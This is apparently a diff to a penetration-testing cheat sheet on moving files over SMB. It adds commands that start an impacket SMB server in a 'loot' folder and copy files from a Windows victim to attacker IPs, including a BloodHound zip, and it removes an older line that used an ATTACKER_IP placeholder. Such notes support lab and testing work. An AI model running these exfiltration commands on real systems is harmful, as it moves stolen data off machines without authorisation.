@@ -134,7 +134,9 @@ get file
 Start SMB server:
 
 ```bash
-impacket-smbserver share .
+mkdir loot
+cd loot
+smbserver.py share . -smb2support
 ```
 
 Victim access:
@@ -146,7 +148,14 @@ Victim access:
 Download file:
 
 ```cmd
-copy \\ATTACKER_IP\share\file C:\Temp
+copy file.txt \\10.10.14.5\share\
+```
+
+For authenticated access
+
+```
+smbserver.py share . -smb2support -username test -password test
+copy 20260416085446_BloodHound.zip \\10.150.72.7\share\ (from windows to kali)
 ```
 
 ---
